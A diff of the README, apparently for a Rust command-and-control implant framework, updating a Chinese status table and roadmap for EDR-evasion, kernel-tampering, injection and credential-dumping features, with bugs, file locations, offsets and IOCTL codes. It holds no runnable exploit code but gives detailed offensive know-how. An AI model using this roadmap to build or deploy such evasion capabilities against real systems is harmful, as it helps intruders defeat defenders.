-| **栈欺骗 SPOOF_SWAP** | 🟡部分实现 | `mov rsp` asm 不崩,但 f 未在伪造栈执行;`#CP` 修复缝仅 doc。CET-off 主机运行时自动 arm ON(`entry.rs:143-150`),非"默认 OFF" |
-| **WinHTTP TLS beacon** | 🟡有 bug | `WinHttpSetOption` 在 `WinHttpSendRequest` 失败后才设(`transport.rs:347-354`);应改到 send 之前。**默认不走此路径**(`NYX_TLS_INSECURE` 默认 OFF);明文 HTTP + 有效 CA HTTPS 正常 |
-| **Pool Party 注入** | 🟡仅投递半 | 只有 section 投递,无 threadless 调度,退到 `NtCreateThreadEx`(经典 IOC 存在)。默认 OFF |
-| **MiniFilter 解链** | ✅完整 | 算法 + flt_globals 解析 + PDB 工具 + CLI/server/client 全链接通 |
-| **WFP silencer** | 🔴装配但必失败 | `block_outbound_for_pid` 永返 Err(安全 stub);tier 误报 `wfp=true` |
-| **etw_deception 事件伪造** | 🟡死代码 | 完整实现但无 tier/CLI 调用方 |
-| **nyx-loader 反射加载** | 🔴未实现 | 加密+组装真;PIC stub 以 `ret` 结尾,PEB walk/import resolve 是 Phase-2b |
-| **nyx-mutate 指令替换** | 🔴不存在 | 只有 NOP 插入/寄存器轮转/密钥随机化三趟 |
-| **transport/ crate** | 🟡零消费者 | 8 个 `Transport` impl + 1 stub,但无 beacon 调用;只有 JA3/JA4 计算接在 server |
-| **指纹 emitter** | 🔴死代码 | 出站 JA3 不可控;`rquest` feature 空占位 |
-| **fallback 链** | 🟡stub | 只有 `[Channel::Https]` 一个元素,`next_fallback` 永返 None |
-| **C2 通道多样性** | 🟡需理解 | implant-win dispatcher 9 个,但 4 个 ExtC2(Slack/LLM/MCP/Discord)是 server 中转 `post_frame`,非直连第三方协议;DoH/DNS 是 URI 伪装 |
-| **GUI 功能覆盖** | ✅全接入 | GUI console 命令层已接入全部 server 端点(kernel×6 / generate / implants / revoke / trex / channel×9 / keylog stream / socks / creds / audit);与 TUI 差异仅剩会话元数据 overlay(rename/tag/star/alias,客户端本地功能)。2026-07-16 本机 e2e 全过 |
-| **`rest` crate** | 🟡半真相源 | server 不依赖它(自定义 view struct),只有两个 client 用;drift 靠人工约定 |
-| **Win11 25H2 真机** | 🟡暂缓 | 需 CET+HVCI 物理机 |
-| **sessions 持久化** | ✅持久化 | SQLite durability layer(`lib.rs:201`),boot 恢复;2026-07-16 实测重启 server 会话同 id 复原 |
-| **SQLite migration** | 🔴无 | 仅 `CREATE TABLE IF NOT EXISTS` |
-
-完整审计(含 25 条文档偏差表 + 19 条活跃缺陷):[`docs/audits/CODE_TRUTH_2026-07-15.md`](docs/audits/CODE_TRUTH_2026-07-15.md)
+| **睡眠混淆 Fluctuation** | 🔴 **未接线** | `fluctuation.rs` 实现完整,但 `kits.rs:65-71` 的 `sleep()` 短路到 `beacon::sleep_seconds`(纯 `NtWaitForSingleObject`)。注释承认"Foliage fluctuation crashes in noevasion mode"。`mem::mask()` 注册了 config/key/heap 区域但永不调用。**中睡眠时 .text/config/key 为明文。** |
+| **Foliage APC .text 加密** | 🔴 死代码 | `sleep.rs` 仅脚手架(`FoliageRaw` 等),`sleep::sleep()` 零调用方。文档提到的 `execute_foliage_plan`/`FOLIAGE_ENABLED` 符号在代码中不存在。 |
+| **transport/ crate** | 🟡 零消费者 | 6 个 `Transport` impl(Malleable/DoH/Slack/LLM/MCP/SMB)+ trait 本身在 crate 外**零引用**。server 用裸 `tokio-rustls`,implant 用自滚 WinHTTP。仅 JA3/JA4 计算接入 server。 |
+| **TLS 指纹 emitter** | 🔴 死代码 | `build_impersonating_client` 永返 `Err(BackendUnavailable)`(`fingerprint.rs:144-148`),`rquest` 依赖未在 Cargo.toml。出站 JA3 不可控。 |
+| **caller-spoof** | 🟡 仅 scanner | `caller_spoof.rs` 只扫 `ADD RSP,imm8;RET` stub,文档所述 `call_with_spoofed_return!` 宏不存在。 |
+| **proxy_veh 注册路径** | 🟡 未用 | `register_section_backed_handler` 完整实现(KnownDlls SEC_IMAGE + code cave trampoline),但 HWBP 路径直接用 `AddVectoredExceptionHandler`。gadgets 扫描后未消费。 |
+| **Pool Party 注入** | 🟡 完整但默认 OFF | `tp.rs` 全实现(section 投递 + worker-factory 劫持 + `_TP_DIRECT` splice),仅 `NYX_POOL_PARTY_ON=1 && method=0 && pid!=0` 时触发。 |
+| **BOF 兼容面** | 🟡 窄 | Beacon-API 表只有 `BeaconPrintf`(`bof-runner/src/win.rs:179`)。多数社区 BOF 在重定位时 `Unresolved` 失败。每次执行泄漏 RWX 页,crate 零测试。 |
+| **WfpKit(内核)** | 🔴 装配但永失败 | `netsec.rs:block_outbound_for_pid` 永返 Err(拒绝零条件 filter);`assemble_tier` 设 `wfp: None`。**注:implant-win 中无任何 WFP 代码**(grep 零命中)。 |
+| **PatchGuard bypass** | 🟡 偏移未验证 | `persistence.rs:550-720` 用 valid_flag 置零法,偏移 `prcb_pg_thread=0x190`/`valid=0x08` 代码自标需 PDB 验证。非 Outflank Peekaboo 法。 |
+| **EdrNeutralizer::kill** | 🟡 仅 resolve | 只解析 EPROCESS KVA,不终止目标进程。 |
+| **WdtKernel 驱动** | 🟡 stub | 物理内存 r/w(0x9C412420/0x9C41242C)真,但 VA `raw_rw` 永返 `Err(0)`。 |
+| **etw_deception 事件伪造** | 🟡 死路径 | 完整实现,但无 tier 装配;仅 `operator-kernel-cli forge-etw` 子命令调用。 |
+| **nyx-loader 反射加载** | 🔴 参考实现 | 加密+组装真;PIC stub 自定位后 `ret`(`stub.rs:71-89`),27B trampoline 空间未 patch。PEB walk/import resolve/DllMain 是 std 参考实现,非 on-target。 |
+| **implant-evasionsdk trait** | 🟡 全 floor | 9 trait 仅 `Floors` no-op impl(`lib.rs:366-413`)。算法子模块(gap/frame/rc4/foliage/apc/swap/offsets_table)真且测试,但非 test build 下 `#[allow(dead_code)]`。 |
+| **`mask_secret()`** | 🔴 stub | 永返 `"********"`,文档承诺的 `first2….last2` 未实现(`store/src/model.rs:72-74`)。 |
+| **SQLite migration** | 🟡 仅基线 | `migrate()` 框架真,但 v0→v1 是 no-op;所有表用 `CREATE TABLE IF NOT EXISTS`。 |
+| **`created_by` 归因** | 🔴 未接 | implant 记录的 operator 归因永为 `None`(`implant_gen.rs:620` TODO)。 |
+| **fallback 链** | 🟡 短 | 只有 `Https → DohDns → Dns`(`channels/mod.rs:259`)。 |
+| **GUI 渲染盲点** | 🟡 部分 | `image`/`channel`/`file` 结果是占位符;`ProcessTable.tsx` 死文件;`fetch_profile` 定义但前端未调。 |
+| **Win11 25H2 真机** | 🟡 暂缓 | 需 CET+HVCI 物理机。 |
+| **BOF 内存泄漏** | 🟡 | `bof-runner` 每次执行不释放 RWX/trampoline 页(`win.rs`)。 |
+| **sessions 持久化** | ✅ 完整 | SQLite durability layer,boot 恢复,2026-07-16 实测重启同 id 复原。 |
 
 ---
 
@@ -451,20 +387,26 @@ cargo clippy --workspace -- -D warnings
 | 同上 | /hashdump SAM + SYSTEM hive | ✅ |
 | Win11 24H2(build 26100,CI runner) | 编译无回归 | ✅ |
 | Win11 25H2 CET+HVCI 物理机 | SPOOF_SWAP CET 修复缝 / HVCI 硬件触发 | 🟡 需物理机 |
+| macOS(team server + agent-dev + GUI) | 协议循环 + 操作端 | ✅(本次审计期间实测 server 运行 + 真实 beacon 会话) |
 
 ---
 
 ## Roadmap
 
-- **TLS beacon 修复** — `WinHttpSetOption` 移到 `WinHttpSendRequest` 之前
-- **SPOOF_SWAP 完成** — CET `#CP` 修复缝(`KiControlProtectionFault` + `RtlRestoreContext`)+ 伪造栈执行
-- **CET 物理机验证** — Win11 25H2 CET+HVCI 真机
-- **nyx-loader 反射加载** — PEB walk / import resolve / DllMain
-- **GUI 会话元数据 overlay** — rename / tag / star / alias(TUI 有,GUI 无;客户端本地功能)
-- **transport/ crate 接线** — 让 beacon 走 `TransportStack` 而非自滚 WinHTTP
+- **接线睡眠混淆** — 让 beacon 循环走 `fluctuation::sleep`(当前 `kits::sleep` 短路)。**最高优先级**,直接决定睡眠期内存扫描对抗能力。
+- **nyx-loader 反射加载** — PEB walk / import resolve / DllMain on-target 实现(当前 PIC stub 以 `ret` 结尾)。
+- **BOF API 扩面** — 接入 `BeaconDataParse`/`BeaconIsAdmin`/`BeaconGetSpawnTo` 等,提升社区 BOF 兼容性;补页释放。
+- **transport/ crate 接线** — 让 beacon 走 `TransportStack` 而非自滚 WinHTTP,激活 6 个零消费者 channel。
+- **TLS 指纹 emitter** — 实现 `build_impersonating_client`(需引入 `rquest` 或 BoringSSL)。
+- **PatchGuard 偏移验证** — 用 PDB 校验 PRCB/context 偏移,或改用 Outflank Peekaboo 时序法。
+- **caller-spoof 完成** — 实现 `call_with_spoofed_return!` 宏(当前仅 scanner)。
+- **GUI 会话元数据 overlay** — rename / tag / star / alias(TUI 曾有,GUI 无)。
+- **CET 物理机验证** — Win11 25H2 CET+HVCI 真机 + `#CP` 修复缝(`KiControlProtectionFault` + `RtlRestoreContext`)。
+- **`mask_secret` 真实现** — `first2….last2` 掩码。
+- **SQLite migration 真演化** — 超出 `CREATE TABLE IF NOT EXISTS` 基线。
 
 ---
 
 ## 免责声明
 
-本项目仅用于授权安全测试和研究目的。**请勿在未明确授权的系统上部署或运行。**
+本项目仅用于授权安全测试和研究目的。**请勿在未明确授权的系统上部署或运行。** 所有内核绕过、注入、凭据提取能力仅限于合法授权的红队 / 渗透测试场景。
